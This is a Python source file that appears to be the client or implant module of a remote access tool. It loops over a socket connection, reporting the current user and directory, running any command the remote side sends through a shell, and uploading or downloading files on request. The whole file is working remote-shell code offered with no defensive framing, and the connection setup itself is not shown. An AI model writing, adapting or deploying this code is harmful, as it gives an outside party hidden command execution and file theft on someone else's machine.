#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : yyxzz
# @Software: PyCharm
# @Time    : 2020/8/17 11:03

import os
import sys
import subprocess
from chardet import detect
from misc.encoding import Encode
from clentModule.fileOperation import FileOPT

class Shell:
    def __init__(self, client, sendBufferSize = 4096, recvBufferSize = 8192):
        self.client = client
        self.sendBufferSize = sendBufferSize
        self.recvBufferSize = recvBufferSize

    def shell(self):
        while True:
            pwd = os.getcwd()
            currentUser = subprocess.run("whoami", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, encoding=Encode.encoding).stdout.strip(r"\n").strip()
            title = "(%s) %s > " % (currentUser, pwd)
            self.client.send(title.encode(Encode.encoding))
            cmd = self.client.recv(self.recvBufferSize).decode(Encode.encoding)
            if cmd in ["quit", "exit", "q"]:
                # self.client.send("Shell Down !".encode(Encode.encoding))
                return 0
                # self.client.close()
            try:
                if cmd[:2] == "cd":
                    os.chdir(cmd[3:])
                    self.client.send(cmd.encode(Encode.encoding))
                elif cmd[1] == ":":
                    os.chdir(cmd)
                    self.client.send(cmd.encode(Encode.encoding))
                elif cmd[:6].lower() == "upload":
                    fileUpload = FileOPT(self.client)
                    fileUpload.upload()
                elif cmd[:8].lower() == "download":
                    file = FileOPT(self.client)
                    file.download()
                else:
                    result = subprocess.run(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    # 判断成功执行与否，及stdout是否为空
                    if result.returncode == 0:
                        self.client.send(result.stdout) if len(result.stdout) != 0 else self.client.send(cmd.encode(Encode.encoding))
                    else:
                        self.client.send(result.stderr)
            except FileNotFoundError:
                self.client.send("No Such File or Directory !".encode(Encode.encoding))
            except:
                self.client.send("An ERROR !".encode(Encode.encoding))
